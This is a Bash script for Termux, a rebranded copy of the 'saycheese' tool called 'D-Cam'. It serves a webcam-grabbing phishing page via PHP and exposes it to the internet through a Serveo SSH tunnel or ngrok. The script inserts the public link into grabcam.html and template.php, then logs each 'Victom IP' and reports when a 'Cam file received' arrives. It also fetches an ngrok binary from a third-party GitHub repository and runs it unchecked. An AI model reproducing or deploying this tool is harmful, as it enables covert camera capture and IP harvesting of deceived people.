#!/bin/bash
# coded by: github.com/thelinuxchoice/saycheese
# This script modified Darken Pasiya
# Hearlty thanks for linuxchoice
# If you use any part from this code, giving me the credits. Read the Lincense!
clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear
trap 'printf "\n";stop' 2


banner() {

echo -e "\e[31m"
cat banner.txt
echo -e '
     \e[34m█████████                 █████████
    \e[32m░░\e[34m███\e[32m░░░░\e[34m███              ███\e[32m░░░░░\e[34m███
     \e[32m░\e[34m███   \e[32m░░\e[34m███            ███     \e[32m░░░   \e[34m██████   █████████████
     \e[32m░\e[34m███    \e[32m░\e[34m███ \e[35m██████████\e[32m░\e[34m███          \e[32m░░░░░\e[34m███ \e[32m░░\e[34m███\e[32m░░\e[34m███\e[32m░░\e[34m███
     \e[32m░\e[34m███    \e[32m░\e[34m███\e[32m░░░░░░░░░░ \e[32m░\e[34m███           ███████  \e[32m░\e[34m███ \e[32m░\e[34m███ \e[32m░\e[34m███
     \e[32m░\e[34m███    ███            \e[32m░░\e[34m███     ███ ███\e[32m░░\e[34m███  \e[32m░\e[34m███ \e[32m░\e[34m███ \e[32m░\e[34m███
    \e[34m ██████████              \e[32m░░\e[34m█████████ \e[32m░░\e[34m████████ █████\e[32m░\e[34m███ █████
    \e[32m░░░░░░░░░░                ░░░░░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░ '


echo " "
printf "      \e[1;35m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
printf "          \e[1;32m      Modified by { Darken Pasiya }\e[0m \n"

echo 
printf "\n"

echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
                   OR ELSE YOU DONT GET LINK....!"

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Victom IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] \e[1;97mTarget opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] \e[1;96mCam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1

if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 6

echo 
echo 
echo -e "\e[1;36m╔══════════════════ \e[1;35mDARKEN PASIYA \e[1;36m═══════════════════╗"
echo -e "\e[1;36m║         \e[1;31m \                            /            \e[1;36m║"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
printf "\e[1;96m╠\e[1;90m══════\e[1;77m %s\e[0m $link \e[1;90m═══════\e[1;96m╣\n"
echo -e "\e[1;36m║         \e[1;31m /                            \            \e[1;36m║"
echo -e "╚══════════════════ \e[1;35mDARKEN PASIYA \e[1;36m═══════════════════╝"

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option:\n\n \e[0m'
echo -e "╭─[ DARKEN PASIYA ]" | lolcat
read -p $'\e[36m ╰───\e[31mroot@.\e[32m/\e[33mDarken-Pasiya\e[35m/\e[32mD-Cam= \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}

###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e '
     \e[34m█████████                 █████████
    \e[32m░░\e[34m███\e[32m░░░░\e[34m███              ███\e[32m░░░░░\e[34m███
     \e[32m░\e[34m███   \e[32m░░\e[34m███            ███     \e[32m░░░   \e[34m██████   █████████████
     \e[32m░\e[34m███    \e[32m░\e[34m███ \e[35m██████████\e[32m░\e[34m███          \e[32m░░░░░\e[34m███ \e[32m░░\e[34m███\e[32m░░\e[34m███\e[32m░░\e[34m███
     \e[32m░\e[34m███    \e[32m░\e[34m███\e[32m░░░░░░░░░░ \e[32m░\e[34m███           ███████  \e[32m░\e[34m███ \e[32m░\e[34m███ \e[32m░\e[34m███
     \e[32m░\e[34m███    ███            \e[32m░░\e[34m███     ███ ███\e[32m░░\e[34m███  \e[32m░\e[34m███ \e[32m░\e[34m███ \e[32m░\e[34m███
    \e[34m ██████████              \e[32m░░\e[34m█████████ \e[32m░░\e[34m████████ █████\e[32m░\e[34m███ █████
    \e[32m░░░░░░░░░░                ░░░░░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░ ' | lolcat
echo 
echo 
echo -e $green"[#]> v1.0 coded by github.com/thelinuxchoice/saycheese  " |lolcat
echo -e $green"[#]> MODIFIED BY DARKEN PASIYA  " |lolcat
echo -e $green"[#]> Thanks For Using My Tool" |lolcat
sleep 1
echo -e $green"[#]> D-CAM HAS STOPED" |lolcat
echo -e $green"[#]> Have A Nice Day...😉" |lolcat
xdg-open https://github.com/Darken-Pasiya
sleep 1
exit
}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="grabcam$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1
